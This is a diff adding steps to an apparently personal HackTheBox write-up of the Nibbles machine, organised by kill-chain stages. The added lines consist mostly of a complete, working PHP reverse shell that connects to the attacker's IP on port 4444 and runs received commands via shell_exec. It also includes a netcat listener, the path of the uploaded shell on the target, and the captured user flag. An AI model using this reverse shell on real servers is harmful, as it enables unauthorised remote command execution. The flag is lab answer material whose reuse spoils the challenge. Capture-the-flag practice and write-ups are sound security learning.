@@ -97,12 +97,68 @@ But it's telling us to try manualy.
 
 SO we create image.php
 
+```PHP
+<?php
+// Réverse shell PHP minimal
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.117';  // votre IP d'écoute
+$port = 4444;  // votre port d'écoute
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
 
+// ouverture du socket
+if (!function_exists('stream_set_blocking')) {
+    die("stream_set_blocking() manquante");
+}
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    die("$errstr ($errno)");
+}
+
+// redirection des descripteurs
+$fds = array($sock, STDIN, STDOUT, STDERR);
+stream_set_blocking($sock, false);
+stream_set_blocking(STDIN, false);
+
+// boucle principale
+while (1) {
+    // lecture depuis le socket
+    if (feof($sock)) break;
+    $read = array($sock);
+    $num_changed_streams = stream_select($read, $write_a, $error_a, null);
+
+    if (in_array($sock, $read)) {
+        $input = fgets($sock, $chunk_size);
+        if (!$input) break;
+        // exécution de la commande et renvoi du résultat
+        $output = shell_exec($input);
+        fwrite($sock, $output);
+    }
+}
+fclose($sock);
+?>
+```
 
 ## 3. **Delivery
 
+![[Pasted image 20250421185409.png]]
+
 ## 4. **Exploitation
 
+```BASH
+┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-3oaajlzaes]─[~]
+└──╼ [★]$ nc -lvnp 4444
+```
+
+And once we go to : 
+http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
+
+we have our #RCE 
 
 ## 5. **Installation
 
@@ -110,3 +166,10 @@ SO we create image.php
 
 ## 7. **Actions on Objectives
 
+```BASH
+ls /home/nibbler
+personal.zip
+user.txt
+cat /home/nibbler/user.txt           
+52e5f38017a66a6418f66d0036540450
+```
